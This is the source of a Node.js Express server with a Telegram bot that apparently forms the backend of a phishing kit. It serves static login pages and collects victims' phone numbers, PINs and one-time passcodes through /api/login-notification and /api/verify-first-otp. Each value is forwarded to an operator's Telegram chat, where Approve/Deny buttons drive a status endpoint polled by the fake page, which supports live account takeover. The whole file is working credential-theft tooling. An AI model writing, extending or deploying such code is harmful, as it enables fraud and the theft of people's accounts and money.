const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    const currentTime = new Date().toLocaleString('en-US', {
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    statusStore[phone] = "pending";

    const message =
        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
        `🆕 NEW USER\n` +
        `📱 Phone Number: ${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${currentTime}\n\n` +
        `⚠️ User waiting for approval`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${phone}_${pin}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: `deny_${phone}` }
                    ]
                ]
            }
        });

        res.json({ success: true });

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    const currentTime = new Date().toLocaleString('en-US', {
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    const otpMessage =
        `1️⃣ FIRST OTP RECEIVED\n\n` +
        `📱 Phone: ${phone}\n` +
        `🔓 OTP: ${otp}\n` +
        `⏰ Time: ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage);
        res.json({ success: true });

    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    statusStore[phone] = "approved";

    const msg =
        `✅ LOGIN APPROVED\n\n` +
        `📱 ${phone}\n` +
        `🔐 ${pin}`;

    try {
        await ctx.editMessageText(msg);
    } catch (e) {
        console.error(e.message);
    }
});

bot.action(/deny_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";

    try {
        await ctx.editMessageText("❌ LOGIN DENIED");
    } catch (e) {
        console.error(e.message);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
};

startBot();
